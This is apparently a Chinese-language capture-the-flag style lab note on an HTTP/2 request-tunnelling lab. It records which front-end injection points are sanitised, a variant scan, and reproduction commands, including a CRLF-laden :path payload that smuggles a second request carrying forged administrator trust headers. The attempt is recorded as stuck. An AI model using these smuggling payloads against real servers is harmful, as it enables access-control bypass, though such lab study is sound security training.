---
title: lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling
---

# lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

> evidences: [[h2-smuggling-family]]

- 题面:以 administrator 访问 `/admin` 并删 carlos;前端 h2→h1 降级、"fails to adequately sanitize incoming header names"、不复用后端连接(只剩 tunnelling)。
- 实例(批50):https://0ae10020036114ba819c1b4a001100b6.web-security-academy.net
- 判定:**stuck**(注入面/读通道全部量化,门仍=会话角色;批50 一刀扫无翻转 ⇒「隧道继承信任位」记死)

## 前端头名消毒矩阵(批47,可复现)

| 注入位置 | 结果 |
| --- | --- |
| 头**值**含 `\r\n` | `RST_STREAM` |
| 头**名**含 `\r\n` | `400 {"error":"Invalid request"}` |
| 头**名**含裸 `\n` | `400 Newlines in headers are not allowed` |
| 头**名**含空格 / 制表 | **放行**(401),未越权 |
| **`:path` 含 CRLF** | **放行且原样写进 h1** ⇒ 唯一可用注入面 |

## 批50 变体一刀扫(tunnel_variant_scan --outer-method HEAD --outer-path /admin --inner-path /admin --baseline 401)

| 格 | 结果 |
| --- | --- |
| clean(直发 HEAD /admin) | 401, content-length 2776 |
| path-open(内层块不收尾) | `500 Received only 174 of expected 2776 bytes of data`(记账 oracle 取到 M=2776) |
| path-closed(内层块收尾) | 401 且 **h2 body 给出内层响应原文**(内层状态可读) |
| path-closed-cl0(内层 `Content-Length: 0`) | 401,同上可读 |
| name-open / name-closed(注入头名) | `400 {"error":"Invalid request"}` |

`flips=[]`。**与批47 读通道结论相反的细节**:本例「可读内层响应」要求内层块**收尾**;不收尾时
前端按期望长度记账(短读 174/2776)。

## 信任头注入(批50)

把 `X-SSL-VERIFIED: 1` + `X-SSL-CLIENT-CN: administrator` 塞进**内层请求块**(收尾形)后,
内层 `/admin` 仍 **401**(2776B,文案 `Admin interface only available if logged in as an administrator`)
⇒ 门不是这些头、也不继承前端信任位,是**会话角色**。

## 结论/下一步

隧道只能原样搬运字节,不能借来前端的信任位;`:path` CRLF 是唯一注入槽,而它到达后端的请求
自带不了角色。按纪律把「隧道继承信任位」整行**记死**;真要破,只能走"获取管理员会话"专轮
(注册/角色参数、会话 cookie 可预测性、凭据复用;件面 cred_matrix/http_session/jwt/objref_scan 已够),
不在隧道维度磨。

## 复现命令

```
tunnel_variant_scan <inst>/ --outer-method HEAD --outer-path /admin --inner-method GET --inner-path /admin --baseline 401 --read-ms 4000
h2_req <inst>/ --method HEAD --path '/admin HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /admin HTTP/1.1\r\nHost: <inst>\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\n\r\n' --read-ms 4000
```

## 关系

- 族:[[h2-smuggling-family]];方法见 [[h2-tunnelling-and-h2cl-practice]](凭据来路=TLS 层 ⇒ 记死)。
